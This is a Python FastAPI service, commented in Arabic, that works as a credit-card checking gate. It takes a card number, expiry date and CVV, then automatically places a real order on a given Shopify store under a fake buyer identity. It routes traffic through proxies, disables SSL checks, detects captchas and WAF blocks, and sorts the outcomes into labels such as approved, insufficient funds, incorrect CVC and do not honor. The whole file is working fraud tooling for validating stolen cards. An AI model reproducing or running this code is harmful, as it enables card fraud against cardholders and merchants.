from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
import requests
import re
import uuid
import random
import time
import urllib3
from html import unescape
from urllib.parse import urlparse

# إخفاء تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    proxy_str = proxy_str.replace('http://', '').replace('https://', '')
    parts = proxy_str.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return f"http://{proxy_str}"

def safe_response(msg, raw_data, price, gate="Python X-Ray"):
    raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:70] if raw_data else "No Raw Data"
    final_msg = f"{msg} | RAW: {raw_clean}" if "Failed" in msg or "Error" in msg or "Declined" in msg else msg
    clean_price = str(price).replace('$', '').strip() if price else "-"
    return {"Response": final_msg, "Price": clean_price, "Gate": gate}

@app.get("/code/index.php")
def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    try:
        cc_parts = re.findall(r'\d+', cc.replace('|', ' '))
        if len(cc_parts) < 4: return JSONResponse(content=safe_response("Invalid CC Format", "", "-"))
        cc_num, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = url.rstrip('/')
        try: scope_host = urlparse(store_url).netloc or store_url.replace('https://', '').replace('http://', '').split('/')[0]
        except: scope_host = store_url.replace('https://', '').replace('http://', '').split('/')[0]
        
        proxy_url = format_proxy(proxy)
        proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

        buyer = {
            "email": f"j.doe{random.randint(10000,99999)}@gmail.com", "first_name": "James", "last_name": "Smith",
            "address1": "4024 College Point Blvd", "city": "Flushing", "province": "NY", "zip": "11354", "country": "US", "phone": "2125551234"
        }

        with requests.Session() as session:
            session.verify = False
            if proxies: session.proxies.update(proxies)
            
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9'
            })

            variant_id, price = None, "-"
            ep = f"{store_url}/products.json?limit=250"
            try:
                r1 = session.get(ep, timeout=15)
                if r1.status_code == 200:
                    data = r1.json()
                    prods = data.get('products', []) if isinstance(data, dict) else (data if isinstance(data, list) else [])
                    for p in prods:
                        for v in p.get('variants', []):
                            if v.get('available'):
                                pr = float(v.get('price', 0))
                                if pr > 10000: pr /= 100.0
                                if pr > 0:
                                    variant_id, price = str(v.get('id')), "{:.2f}".format(pr)
                                    break
                        if variant_id: break
                else:
                    return JSONResponse(content=safe_response("Blocked at Product Fetch", f"HTTP {r1.status_code}", "-"))
            except Exception as e:
                return JSONResponse(content=safe_response("Proxy Connection Failed", str(e), "-"))

            if not variant_id: 
                return JSONResponse(content=safe_response("Product Not Found", "No variants available", "-"))

            session.headers.update({"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"})
            add_res = session.post(f"{store_url}/cart/add.js", json={"id": variant_id, "quantity": 1})
            if add_res.status_code not in [200, 201]: 
                return JSONResponse(content=safe_response("Cart Add Blocked", f"HTTP {add_res.status_code}", price))

            time.sleep(1)

            session.headers.pop("X-Requested-With", None)
            session.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
            
            res_chk = session.post(f"{store_url}/cart", data={"checkout": "Checkout"}, allow_redirects=True)
            html_chk = res_chk.text
            final_url = str(res_chk.url)

            if res_chk.status_code in [403, 429]:
                return JSONResponse(content=safe_response("WAF Blocked Checkout", html_chk[:80], price))
            
            if 'hcaptcha' in html_chk.lower() or 'g-recaptcha' in html_chk.lower() or 'challenge-platform' in html_chk.lower():
                return JSONResponse(content=safe_response("Store Demands Captcha", html_chk[:80], price))

            is_graphql = False
            session_token, checkout_token = None, None

            ct_match = re.search(r'/checkouts/(?:c|cn|unstable|c/graphql)/([^/?]+)', final_url)
            if ct_match: checkout_token = ct_match.group(1)

            meta_st = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html_chk)
            js_st = re.search(r'["\']?sessionToken["\']?\s*:\s*["\']([^"\']{20,})["\']', html_chk, re.IGNORECASE)
            
            if meta_st:
                is_graphql = True; session_token = unescape(meta_st.group(1))
            elif js_st:
                is_graphql = True; session_token = unescape(js_st.group(1))
            else:
                jwt_match = re.search(r'(eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})', html_chk)
                if jwt_match: is_graphql = True; session_token = jwt_match.group(1)

            if not is_graphql:
                title = re.search(r'<title>(.*?)</title>', html_chk, re.IGNORECASE)
                t_str = title.group(1).strip() if title else "No Title"
                return JSONResponse(content=safe_response("Token Not Found", f"Page Title: {t_str}", price))

            if not checkout_token: checkout_token = "unknown"

            pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json"}
            res_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc_num, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
            
            if res_pci.status_code != 200:
                res_pci = session.post("https://deposit.us.shopifycs.com/sessions", json={"credit_card": {"number": cc_num, "month": mm, "year": yy, "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)

            if res_pci.status_code != 200: 
                return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:80], price))
            card_session_id = res_pci.json().get("id")

            # =========================================================
            # التعديل الصارم: بنية العنوان المطلوبة بالضبط لـ GraphQL
            # =========================================================
            flat_address = {
                "address1": buyer["address1"], 
                "city": buyer["city"], 
                "countryCode": buyer["country"], 
                "firstName": buyer["first_name"], 
                "lastName": buyer["last_name"], 
                "phone": buyer["phone"],
                "postalCode": buyer["zip"], 
                "zoneCode": buyer["province"]
            }

            gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
            gql_headers = {
                'shopify-checkout-client': 'checkout-web/1.0', 'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
                'x-checkout-web-source-id': checkout_token, 'x-checkout-one-session-token': session_token, 'Content-Type': 'application/json'
            }
            merch_id = str(uuid.uuid4())
            
            prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken}}}}}"""
            prop_vars = {
                "delivery": {
                    "deliveryLines": [{
                        "destination": flat_address,  # تم إسناد العنوان مباشرة هنا بدون partialStreetAddress
                        "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "destinationChanged": True,
                        "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}},
                        "expectedTotalPrice": {"any": True}
                    }],
                    "supportsSplitShipping": True
                },
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [],
                    "billingAddress": flat_address
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": merch_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}"
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True}
                    }]
                },
                "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"]},
                "sessionInput": {"sessionToken": session_token}
            }
            
            res_prop = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
            queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
            
            if not queue_token: 
                return JSONResponse(content=safe_response("Proposal Failed", res_prop.text[:100], price))
            time.sleep(1)

            sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
            sub_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitRejected{errors{code localizedMessage}}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}}}"""
            sub_vars = {
                "attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}",
                "input": {
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": queue_token,
                    "delivery": {
                        "deliveryLines": [{
                            "destination": flat_address, # تم إسناد العنوان مباشرة هنا
                            "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "destinationChanged": False,
                            "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {"phone": buyer["phone"]}},
                            "expectedTotalPrice": {"any": True}
                        }],
                        "supportsSplitShipping": True
                    },
                    "merchandise": prop_vars["merchandise"],
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319",
                                    "sessionId": card_session_id,
                                    "billingAddress": flat_address
                                }
                            },
                            "amount": {"any": True}
                        }],
                        "billingAddress": flat_address
                    },
                    "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}
                }
            }
            
            res_sub = session.post(sub_url, json={"operationName": "SubmitForCompletion", "query": sub_query, "variables": sub_vars}, headers=gql_headers)
            sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
            
            if sub_data.get('__typename') == 'SubmitRejected':
                errs = sub_data.get('errors', [])
                msg = errs[0].get('localizedMessage', 'Rejected') if errs else 'Rejected'
                return JSONResponse(content=safe_response("Shopify System Rejected", msg, price))
            
            receipt_id = sub_data.get('receipt', {}).get('id')
            if not receipt_id: 
                return JSONResponse(content=safe_response("Submit Failed", res_sub.text[:100], price))

            poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
            poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}}}"""
            
            for _ in range(6):
                res_poll = session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": session_token}}, headers=gql_headers)
                if res_poll.status_code == 200:
                    p_type = res_poll.json().get('data', {}).get('receipt', {}).get('__typename')
                    if p_type == 'ProcessedReceipt': 
                        return JSONResponse(content=safe_response("Order completed 💎", "Success", price))
                    elif p_type == 'FailedReceipt':
                        err = res_poll.json().get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'DECLINED')
                        if "INSUFFICIENT" in err: return JSONResponse(content=safe_response("Insufficient Funds", err, price))
                        elif "CVC" in err: return JSONResponse(content=safe_response("Incorrect CVC", err, price))
                        elif "ZIP" in err or "ADDRESS" in err: return JSONResponse(content=safe_response("ZIP Code Mismatch", err, price))
                        elif "DO_NOT_HONOR" in err: return JSONResponse(content=safe_response("Do Not Honor", err, price))
                        return JSONResponse(content=safe_response(f"Declined: {err}", err, price))
                time.sleep(1.5)
                
            return JSONResponse(content=safe_response("Bank Timeout", "Waited 9 secs for bank", price))

    except Exception as e:
        return JSONResponse(content=safe_response("System Error", str(e), "-"))
